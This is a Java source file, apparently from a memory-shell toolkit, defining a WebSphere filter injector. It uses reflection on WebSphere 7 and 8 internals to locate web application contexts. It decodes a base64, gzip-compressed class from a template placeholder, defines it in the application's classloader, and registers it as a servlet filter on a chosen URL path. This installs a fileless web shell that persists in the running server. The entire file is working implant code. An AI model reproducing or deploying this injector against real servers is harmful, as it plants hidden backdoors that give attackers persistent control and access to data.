package com.reajason.javaweb.memshell.injector.websphere;

import javax.servlet.Filter;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;
import java.util.zip.GZIPInputStream;


/**
 * tested v7、v8
 * update  2023/07/08
 *
 * @author ReaJason
 */
public class WebSphereFilterInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public WebSphereFilterInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    /**
     * com.ibm.ws.webcontainer.webapp.WebAppImpl
     * /opt/IBM/WebSphere/AppServer/plugins/com.ibm.ws.webcontainer.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Object[] wsThreadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
        for (Object wsThreadLocal : wsThreadLocals) {
            // for websphere 7.x
            if (wsThreadLocal != null && wsThreadLocal.getClass().getName().endsWith("FastStack")) {
                Object[] stackList = (Object[]) getFieldValue(wsThreadLocal, "stack");
                for (Object stack : stackList) {
                    try {
                        Object config = getFieldValue(stack, "config");
                        contexts.add(getFieldValue(getFieldValue(config, "context"), "context"));
                    } catch (Exception ignored) {
                    }
                }
            } else if (wsThreadLocal != null && wsThreadLocal.getClass().getName().endsWith("WebContainerRequestState")) {;
                contexts.add(getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(wsThreadLocal, "currentThreadsIExtendedRequest"), "_dispatchContext"), "_webapp"), "facade"), "context"));
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFieldValue(context, "loader"));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    @SuppressWarnings("unchecked")
    public void inject(Object context, Object filter) throws Exception {
        Object webAppConfiguration = getFieldValue(context, "config");
        if (invokeMethod(webAppConfiguration, "getFilterInfo", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
            return;
        }

        ClassLoader classLoader = context.getClass().getClassLoader();
        Class<?> filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
        Class<?> iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
        Class<?> iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");

        Object filterManager = getFieldValue(context, "filterManager");
        try {
            // v8
            Constructor<?> constructor = filterMappingClass.getConstructor(String.class, iFilterConfigClass, iServletConfigClass);
            // com.ibm.ws.webcontainer.webapp.WebApp.commonAddFilter
            setFieldValue(context, "initialized", false);
            Object filterConfig = invokeMethod(context, "commonAddFilter", new Class[]{String.class, String.class, Filter.class, Class.class}, new Object[]{getClassName(), getClassName(), filter, filter.getClass()});
            Object filterMapping = constructor.newInstance(getUrlPattern(), filterConfig, null);
            setFieldValue(context, "initialized", true);

            // com.ibm.ws.webcontainer.filter.WebAppFilterManager.addFilterMapping
            invokeMethod(filterManager, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMapping});

            // com.ibm.ws.webcontainer.filter.WebAppFilterManager#_loadFilter
            invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{getClassName()});

        } catch (Exception e) {
            // v7
            Object filterConfig = invokeMethod(context, "createFilterConfig", new Class[]{String.class}, new Object[]{getClassName()});
            invokeMethod(filterConfig, "setFilterClassName", new Class[]{String.class}, new Object[]{filter.getClass().getName()});
            setFieldValue(filterConfig, "dispatchMode", new int[]{0});
            setFieldValue(filterConfig, "name", getClassName());
            invokeMethod(context, "addMappingFilter", new Class[]{String.class, iFilterConfigClass}, new Object[]{getUrlPattern(), filterConfig});
            invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{getClassName()});
        }
        // 清除缓存
        invokeMethod(getFieldValue(filterManager, "chainCache"), "clear", null, null);
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws
            Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }


    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        try {
            Field field = getField(obj, name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (NoSuchFieldException ignored) {
        }
        return null;
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
